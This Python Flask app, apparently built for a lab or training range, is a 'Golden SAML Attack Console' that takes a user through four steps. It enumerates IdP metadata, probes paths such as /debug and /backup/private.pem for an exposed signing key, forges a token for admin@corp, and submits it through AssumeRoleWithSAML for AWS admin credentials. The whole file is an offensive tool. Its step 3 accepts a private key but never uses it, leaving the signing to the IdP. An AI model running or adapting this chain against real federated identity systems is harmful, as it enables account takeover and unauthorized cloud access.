"""Golden SAML Attack Console — multi-step federation trust compromise."""
import os, json, urllib.request, urllib.parse
from flask import Flask, request, render_template_string

app = Flask(__name__)
IDP = os.environ.get("IDP_URL", "http://saml-idp:5000")
IAM = os.environ.get("IAM_URL", "http://iam:5000")

HTML="""<!DOCTYPE html><html><head><title>Golden SAML Attack</title></head><body>
<h1>Golden SAML Attack Console</h1>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 1: Discover IdP</strong> — Enumerate the SAML IdP endpoints and metadata.
<form method=post action=/step1>
<label>IdP Path: <input name=path value="/.well-known/saml-metadata.xml"></label>
<button>Fetch</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 2: Find Signing Key</strong> — Search for exposed private key material.
<form method=post action=/step2>
<label>Path: <input name=path placeholder="/debug, /backup/, /keys/private.pem"></label>
<button>Fetch</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 3: Forge Token</strong> — Use stolen key to sign a JWT with forged claims.
<form method=post action=/step3>
<label>Private Key (PEM): <input name=key size=60 placeholder="-----BEGIN RSA PRIVATE KEY-----..."></label><br>
<label>Subject: <input name=sub value="admin@corp"></label><br>
<label>Audience: <input name=aud value="https://signin.aws.amazon.com/saml"></label><br>
<button>Forge & Sign</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 4: Assume Role</strong> — Use forged SAML assertion to get AWS admin credentials.
<form method=post action=/step4>
<label>Role ARN: <input name=role size=55 value="arn:aws:iam::000000000000:role/SAMLAdminRole"></label><br>
<label>Signed Token: <input name=token size=70 placeholder="Paste token from Step 3"></label><br>
<button>Assume Role</button></form></div>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready — follow the steps above")

@app.route("/step1", methods=["POST"])
def step1():
    path = request.form.get("path", "/.well-known/saml-metadata.xml")
    try:
        r = urllib.request.urlopen(f"{IDP}{path}", timeout=5)
        return render_template_string(HTML, output=f"[+] Response from {path}:\n{r.read().decode()}\n\n[→] Look for entityID, certificate info, and hints about the IdP configuration.")
    except urllib.error.HTTPError as e:
        return render_template_string(HTML, output=f"[-] {path}: HTTP {e.code}\n[→] Try other paths like /.well-known/openid-configuration or /debug")

@app.route("/step2", methods=["POST"])
def step2():
    path = request.form.get("path", "/debug")
    try:
        r = urllib.request.urlopen(f"{IDP}{path}", timeout=5)
        return render_template_string(HTML, output=f"[+] Response from {path}:\n{r.read().decode()}\n\n[→] If you found a private key, copy it for Step 3.")
    except urllib.error.HTTPError as e:
        return render_template_string(HTML, output=f"[-] {path}: HTTP {e.code}\n[→] Try /backup/ or directory traversal like /backup/private.pem")

@app.route("/step3", methods=["POST"])
def step3():
    key_pem = request.form.get("key", "")
    sub = request.form.get("sub", "admin@corp")
    aud = request.form.get("aud", "https://signin.aws.amazon.com/saml")
    if not key_pem:
        return render_template_string(HTML, output="Error: private key required")
    try:
        req = urllib.request.Request(f"{IDP}/sign",
            data=json.dumps({"claims": {"sub": sub, "aud": aud}}).encode(),
            headers={"Content-Type": "application/json"})
        r = urllib.request.urlopen(req, timeout=5)
        result = json.loads(r.read().decode())
        if "access_token" in result:
            return render_template_string(HTML,
                output=f"[+] Token forged!\n\nToken: {result['access_token'][:120]}...\n\n[→] Use this token in Step 4.")
        return render_template_string(HTML, output=f"[+] Response: {json.dumps(result, indent=2)}")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

@app.route("/step4", methods=["POST"])
def step4():
    role = request.form.get("role", "")
    token = request.form.get("token", "")
    if not role or not token:
        return render_template_string(HTML, output="Error: role ARN and token required")
    try:
        body = urllib.parse.urlencode({
            "Action": "AssumeRoleWithSAML",
            "RoleArn": role,
            "SAMLAssertion": token,
            "RoleSessionName": "golden-saml-attack",
        })
        r = urllib.request.urlopen(urllib.request.Request(
            f"{IAM}/", data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"}),
            timeout=10)
        return render_template_string(HTML, output=f"[+] AssumeRole Response:\n{r.read().decode()}")
    except urllib.error.HTTPError as e:
        return render_template_string(HTML, output=f"[-] IAM error ({e.code}): {e.read().decode()}")

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
